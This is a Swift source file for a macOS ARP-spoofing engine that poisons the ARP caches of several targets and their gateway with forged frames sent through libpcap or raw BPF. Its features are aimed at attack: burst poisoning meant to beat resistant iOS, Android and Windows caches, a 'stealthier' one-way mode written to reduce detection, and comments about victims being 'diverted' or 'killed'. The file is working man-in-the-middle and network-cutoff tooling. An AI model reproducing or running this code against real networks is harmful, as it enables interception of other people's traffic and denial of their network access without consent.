import Foundation
import Darwin
import PastoralCore
import PastoralBPFShim
import libpcap

/// Manages ARP spoofing loops for multiple targets. Each target gets a
/// background thread that sends poison frames every ~1.5s. On stop, the
/// loop sends restoration frames and exits. Thread-safe via a serial
/// dispatch queue.
final class ARPSpoofer {
    let interface: String
    let localMAC: MAC
    let localIP: [UInt8]

    /// One spoof job per target IP.
    private struct SpoofJob {
        let targetIP: [UInt8]
        let targetMAC: MAC
        let gatewayIP: [UInt8]
        let gatewayMAC: MAC
        let plan: ARPSpoofPlan
        let bidirectional: Bool
        var thread: Thread?
        var stopFlag: Bool
    }

    private var jobs: [String: SpoofJob] = [:]   // keyed by target IP string
    private let lock = NSLock()
    private var bpfFD: Int32 = -1
    private var pcapHandle: OpaquePointer? = nil

    init(interface: String, localMAC: MAC, localIP: [UInt8]) {
        self.interface = interface
        self.localMAC = localMAC
        self.localIP = localIP
    }

    deinit {
        if let h = pcapHandle {
            pcap_close(h)
        }
        if bpfFD >= 0 {
            close(bpfFD)
        }
    }

    // MARK: - pcap injection (more reliable than raw BPF write)

    /// Open a pcap handle for injection. libpcap handles the macOS
    /// BIOCSHDRCMPLT/EAFNOSUPPORT bug automatically.
    private func openPcap() -> OpaquePointer? {
        if let h = pcapHandle { return h }
        var errbuf = [CChar](repeating: 0, count: Int(PCAP_ERRBUF_SIZE))
        let handle = interface.withCString { iface in
            pcap_open_live(iface, 65535, 0, 1, &errbuf)
        }
        if let h = handle {
            pcapHandle = h
            FileHandle.standardError.write("ARPSpoofer: pcap_open_live OK on \(interface)\n".data(using: .utf8)!)
            return h
        }
        FileHandle.standardError.write("ARPSpoofer: pcap_open_live failed: \(String(cString: errbuf))\n".data(using: .utf8)!)
        return nil
    }

    /// Send a frame via pcap_inject (preferred) or BPF write (fallback).
    private func sendFrame(_ frame: [UInt8]) {
        // Try pcap_inject first (handles macOS bugs automatically).
        if let h = openPcap() {
            let ret = frame.withUnsafeBufferPointer { buf in
                pcap_inject(h, buf.baseAddress, frame.count)
            }
            if ret >= 0 { return }
            // pcap_inject failed — fall through to BPF write.
        }

        // Fallback: raw BPF write.
        let fd = openBPF()
        guard fd >= 0 else { return }
        let written = frame.withUnsafeBufferPointer { buf in
            write(fd, buf.baseAddress, frame.count)
        }
        if written < 0 {
            if errno == EAFNOSUPPORT {
                var hdrcmplt: UInt = 0
                _ = pastoral_ioctl_ulong(fd, pastoral_BIOCSHDRCMPLT, &hdrcmplt)
                _ = frame.withUnsafeBufferPointer { buf in
                    write(fd, buf.baseAddress, frame.count)
                }
            }
        }
    }

    /// Send a frame 3x for redundancy (nuclear mode).
    private func sendFrame3x(_ frame: [UInt8]) {
        sendFrame(frame)
        sendFrame(frame)
        sendFrame(frame)
    }

    // MARK: - BPF

    /// Verify that at least one frame send channel (pcap preferred, BPF
    /// fallback) can be opened. Called before starting a spoof job so a
    /// missing /dev/bpf* or a pcap_open_live failure surfaces as an error
    /// to the caller instead of every frame being silently dropped.
    private func ensureSendChannel() -> Bool {
        if openPcap() != nil { return true }
        if openBPF() >= 0 { return true }
        return false
    }

    /// Open a BPF device for sending raw frames. Kept open for the lifetime
    /// of the spoofer.
    private func openBPF() -> Int32 {
        if bpfFD >= 0 { return bpfFD }
        for i in 0..<16 {
            let path = "/dev/bpf\(i)"
            let fd = open(path, O_RDWR)
            if fd >= 0 {
                let r = pastoral_ioctl_ifname(fd, pastoral_BIOCSETIF, interface)
                if r != 0 {
                    FileHandle.standardError.write("ARPSpoofer: BIOCSETIF failed on \(path): errno=\(errno)\n".data(using: .utf8)!)
                    close(fd)
                    continue
                }
                var immediate: UInt = 1
                _ = pastoral_ioctl_ulong(fd, pastoral_BIOCIMMEDIATE, &immediate)
                // CRITICAL: Set BIOCSHDRCMPLT=1 so the kernel preserves our
                // source MAC instead of overwriting it with the interface's
                // real MAC. Without this, ARP spoofing is ineffective.
                var hdrcmplt: UInt = 1
                let hdrResult = pastoral_ioctl_ulong(fd, pastoral_BIOCSHDRCMPLT, &hdrcmplt)
                FileHandle.standardError.write("ARPSpoofer: BIOCSHDRCMPLT=1 result=\(hdrResult) errno=\(errno)\n".data(using: .utf8)!)
                bpfFD = fd
                FileHandle.standardError.write("ARPSpoofer: opened \(path) fd=\(fd)\n".data(using: .utf8)!)
                return fd
            }
        }
        FileHandle.standardError.write("ARPSpoofer: failed to open any /dev/bpf* (errno=\(errno))\n".data(using: .utf8)!)
        return -1
    }

    /// Send a frame and log the result (for debugging).
    private func sendFrameLogged(_ frame: [UInt8], label: String) {
        // Try pcap_inject first.
        if let h = openPcap() {
            let ret = frame.withUnsafeBufferPointer { buf in
                pcap_inject(h, buf.baseAddress, frame.count)
            }
            if ret >= 0 {
                let hex = frame.prefix(12).map { String(format: "%02x", $0) }.joined(separator: ":")
                FileHandle.standardError.write("ARPSpoofer: \(label) pcap_inject=\(ret) frame[0:12]=\(hex) len=\(frame.count)\n".data(using: .utf8)!)
                return
            }
        }
        // Fallback to BPF write.
        let fd = openBPF()
        guard fd >= 0 else { 
            FileHandle.standardError.write("ARPSpoofer: \(label) — no BPF fd\n".data(using: .utf8)!)
            return 
        }
        var written = frame.withUnsafeBufferPointer { buf in
            write(fd, buf.baseAddress, frame.count)
        }
        if written < 0 && errno == EAFNOSUPPORT {
            FileHandle.standardError.write("ARPSpoofer: \(label) EAFNOSUPPORT — disabling BIOCSHDRCMPLT and retrying\n".data(using: .utf8)!)
            var hdrcmplt: UInt = 0
            _ = pastoral_ioctl_ulong(fd, pastoral_BIOCSHDRCMPLT, &hdrcmplt)
            written = frame.withUnsafeBufferPointer { buf in
                write(fd, buf.baseAddress, frame.count)
            }
        }
        // Log first 12 bytes of the frame (dst MAC + src MAC + ethertype)
        let hex = frame.prefix(12).map { String(format: "%02x", $0) }.joined(separator: ":")
        FileHandle.standardError.write("ARPSpoofer: \(label) write=\(written) frame[0:12]=\(hex) len=\(frame.count)\n".data(using: .utf8)!)
    }

    // MARK: - Public API

    /// Start spoofing a target. Returns true on success.
    /// - Parameters:
    ///   - targetIP: target IPv4 string (e.g. "10.0.0.5")
    ///   - targetMAC: target MAC
    ///   - gatewayIP: gateway IPv4 string
    ///   - gatewayMAC: gateway MAC
    ///   - bidirectional: when false, only poison the target (the gateway
    ///     is left alone — outbound-only divert, stealthier).
    func startSpoof(targetIP: String, targetMAC: MAC,
                    gatewayIP: String, gatewayMAC: MAC,
                    bidirectional: Bool = true) -> Bool {
        guard let targetIPBytes = parseIPv4(targetIP),
              let gatewayIPBytes = parseIPv4(gatewayIP) else { return false }

        // Ensure we can actually send frames before claiming success.
        // Without a working pcap or BPF channel, the spoof loop would run
        // but no poison frames would reach the wire — the victim would
        // appear "diverted"/"killed" in the UI while nothing happens on
        // the network. Probe up front so the failure surfaces to the caller
        // (and ultimately to the user) as an error instead of a silent no-op.
        guard ensureSendChannel() else {
            FileHandle.standardError.write("ARPSpoofer: startSpoof aborted — no pcap or BPF channel available for \(targetIP)\n".data(using: .utf8)!)
            return false
        }

        lock.lock()
        defer { lock.unlock() }

        // Already spoofing this target? Stop the old job first.
        // Best-effort here: no join, no restore frames — the new job
        // re-poisons immediately anyway, so a stray late frame is moot.
        if jobs[targetIP] != nil {
            signalStopLocked(targetIP: targetIP)
        }

        let direction: ARPSpoofDirection = bidirectional ? .bidirectional : .unidirectional
        let plan = ARPSpoofPlanner.plan(
            targetMAC: targetMAC, targetIP: targetIPBytes,
            gatewayMAC: gatewayMAC, gatewayIP: gatewayIPBytes,
            ourMAC: localMAC,
            direction: direction
        )

        var job = SpoofJob(
            targetIP: targetIPBytes, targetMAC: targetMAC,
            gatewayIP: gatewayIPBytes, gatewayMAC: gatewayMAC,
            plan: plan, bidirectional: bidirectional,
            thread: nil, stopFlag: false
        )

        // Start the spoof loop in a background thread.
        let thread = Thread { [weak self] in
            self?.spoofLoop(targetIP: targetIP)
        }
        thread.name = "spoof-\(targetIP)"
        job.thread = thread
        jobs[targetIP] = job
        thread.start()

        return true
    }

    /// Stop spoofing a target and restore its ARP entries. Signals the
    /// loop to exit, joins it *first*, and only then sends the final
    /// restore frames — the old order (restore, loop notices later) let a
    /// poison frame overtake the restores and re-poison the victim until
    /// its ARP cache timed out.
    func stopSpoof(targetIP: String) {
        var pending: (plan: ARPSpoofPlan?, thread: Thread?) = (nil, nil)
        lock.lock()
        pending = signalStopLocked(targetIP: targetIP)
        lock.unlock()
        waitForThread(pending.thread)
        if let plan = pending.plan { sendRestoreFrames(plan) }
    }

    /// Stop all spoofing and restore all targets. Called on exit/SIGTERM.
    func stopAll() {
        var pendings: [(plan: ARPSpoofPlan?, thread: Thread?)] = []
        lock.lock()
        for ip in Array(jobs.keys) {
            pendings.append(signalStopLocked(targetIP: ip))
        }
        lock.unlock()
        for p in pendings {
            waitForThread(p.thread)
            if let plan = p.plan { sendRestoreFrames(plan) }
        }

        if bpfFD >= 0 {
            close(bpfFD)
            bpfFD = -1
        }
    }

    /// List currently spoofed target IPs.
    var activeTargets: [String] {
        lock.lock()
        defer { lock.unlock() }
        return Array(jobs.keys)
    }

    // MARK: - Internal

    /// Mark a job stopped and detach its thread. Must be called holding
    /// `lock`. Removing the job from `jobs` is what makes the poison loop
    /// exit (it reads `jobs[ip]?.stopFlag ?? true`). Returns the plan and
    /// thread so the caller can join outside the lock before sending the
    /// final restores.
    private func signalStopLocked(targetIP: String) -> (plan: ARPSpoofPlan?, thread: Thread?) {
        guard let job = jobs.removeValue(forKey: targetIP) else { return (nil, nil) }
        job.thread?.cancel()
        return (job.plan, job.thread)
    }

    /// Wait (bounded ~1s) for a detached poison thread to exit, so no
    /// more frames are in flight when the restores go out.
    private func waitForThread(_ thread: Thread?) {
        guard let thread else { return }
        for _ in 0..<200 where !thread.isFinished {
            Thread.sleep(forTimeInterval: 0.005)
        }
    }

    /// Final restore burst, sent only after the poison loop has fully
    /// exited — 3x for reliability. Skips empty frames (unidirectional
    /// mode has no gateway frames).
    private func sendRestoreFrames(_ plan: ARPSpoofPlan) {
        for _ in 0..<3 {
            sendFrame(plan.restoreTarget)
            if !plan.restoreGateway.isEmpty {
                sendFrame(plan.restoreGateway)
            }
        }
    }

    /// The spoof loop: sends poison frames to maintain the ARP cache
    /// override. Strategy:
    ///   - First 10 iterations (burst): 3x each frame type every 10ms
    ///     to quickly override sticky ARP caches (iOS/Android/Windows).
    ///   - After burst: 1x each frame type every 500ms to maintain the
    ///     override without saturating the network. ARP cache entries
    ///     typically expire after 20-60 seconds, so 500ms is more than
    ///     enough to keep them poisoned.
    private func spoofLoop(targetIP: String) {
        var iteration = 0
        let burstIterations = 10   // ~100ms of aggressive poisoning
        while true {
            lock.lock()
            let job = jobs[targetIP]
            let stop = job?.stopFlag ?? true
            lock.unlock()
            if stop { return }

            if let job {
                // Build all frame types once per iteration.
                let gratuitousTarget = ARPFrame.gratuitousRequest(
                    senderMAC: localMAC, senderIP: job.plan.gatewayIP)
                let unicastTarget = ARPFrame.requestUnicast(
                    senderMAC: localMAC, senderIP: job.plan.gatewayIP,
                    targetMAC: job.targetMAC, targetIP: job.plan.targetIP)

                // In unidirectional mode, poisonGateway is empty — skip it
                // and the gateway-side gratuitous/unicast frames entirely.
                // The gateway is never touched, reducing detection surface.
                let gratuitousGateway: [UInt8] = job.bidirectional
                    ? ARPFrame.gratuitousRequest(senderMAC: localMAC, senderIP: job.plan.targetIP)
                    : []
                let unicastGateway: [UInt8] = job.bidirectional
                    ? ARPFrame.requestUnicast(
                        senderMAC: localMAC, senderIP: job.plan.targetIP,
                        targetMAC: job.gatewayMAC, targetIP: job.plan.gatewayIP)
                    : []

                // During burst: 3x each frame type for maximum redundancy.
                // After burst: 1x each — enough to maintain the override.
                let repeats = iteration < burstIterations ? 3 : 1
                for _ in 0..<repeats {
                    sendFrame(job.plan.poisonTarget)
                    if !job.plan.poisonGateway.isEmpty {
                        sendFrame(job.plan.poisonGateway)
                    }
                    sendFrame(gratuitousTarget)
                    if !gratuitousGateway.isEmpty { sendFrame(gratuitousGateway) }
                    sendFrame(unicastTarget)
                    if !unicastGateway.isEmpty { sendFrame(unicastGateway) }
                }

                if iteration == 0 {
                    let frameCount = job.bidirectional ? 18 : 9
                    let mode = job.bidirectional ? "BIDIR" : "UNIDIR"
                    FileHandle.standardError.write("ARPSpoofer: BURST → \(frameCount) frames/burst @10ms for \(burstIterations) iters, then maintenance @500ms, \(mode), target=\(targetIP)\n".data(using: .utf8)!)
                }
                iteration += 1
            }

            // Burst phase: 10ms between bursts.
            // Maintenance phase: 500ms between bursts.
            let interval = iteration < burstIterations ? 0.01 : 0.5
            Thread.sleep(forTimeInterval: interval)

            // Check stop flag.
            lock.lock()
            let s = jobs[targetIP]?.stopFlag ?? true
            lock.unlock()
            if s { return }
        }
    }

    // MARK: - Helpers

    private func parseIPv4(_ string: String) -> [UInt8]? {
        let parts = string.split(separator: ".")
        guard parts.count == 4 else { return nil }
        var bytes: [UInt8] = []
        for part in parts {
            guard let v = UInt8(part) else { return nil }
            bytes.append(v)
        }
        return bytes
    }
}
